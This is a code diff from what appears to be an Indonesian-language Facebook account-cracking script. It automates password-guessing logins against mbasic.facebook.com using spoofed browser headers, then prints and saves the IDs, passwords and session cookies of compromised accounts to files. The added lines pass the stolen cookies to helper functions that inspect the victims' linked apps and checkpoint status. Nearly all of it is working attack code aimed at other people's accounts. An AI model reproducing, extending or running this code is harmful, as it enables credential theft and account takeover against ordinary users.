@@ -1540,21 +1540,44 @@ def reguler(idf,pwv):
             headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
             po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
-                print('\n')
-                print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] TAHUN   : {cektahun(idf)}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
-                os.popen('play-audio c.mp3')
-                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-                akun.append(idf+'|'+pw)
-                cp+=1
-                break
+		    if 'no' in gabriel:
+			    print('\n')
+			    print(f'{K}Akun checkpoint\n[•] ID       : {idf}\n[•] TAHUN   : {cektahun(idf)}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} ')
+			    os.popen('play-audio c.mp3')
+			    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			    akun.append(idf+'|'+pw)
+			    cp+=1
+			    break
+		    elif 'ya' in gabriel:
+			    cp+=1
+			    print('\n')
+			    statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+			    statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
+			    cetak(statuscp1)
+			    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			    akun.append(idf+'|'+pw)
+			    ceker(idf,pw)
+			    break
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                print('\n')
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN   : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
-                os.popen('play-audio o.mp3')
-                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-                break
+		    if 'no' in taplikasi:
+			    ok+=1
+			    print('\n')
+			    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+			    print( f'{H}Akun Succes{P2}\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] TAHUN   : {cektahun(idf)}\n[•] COOKIES  : {kuki}')
+			    os.popen('play-audio o.mp3')
+			    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+			    break
+		    elif 'ya' in taplikasi:
+			    ok+=1
+			    coki=po.cookies.get_dict()
+			    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+			    print('\n')
+			    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+			    statusok1 = nel(statusok, width=90, style='bold green', title='OK')
+			    cetak(statusok1)
+			    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+			    cek_apk(kuki)
+			    break
             else:continue
         except requests.exceptions.ConnectionError:time.sleep(31)
     loop+=1
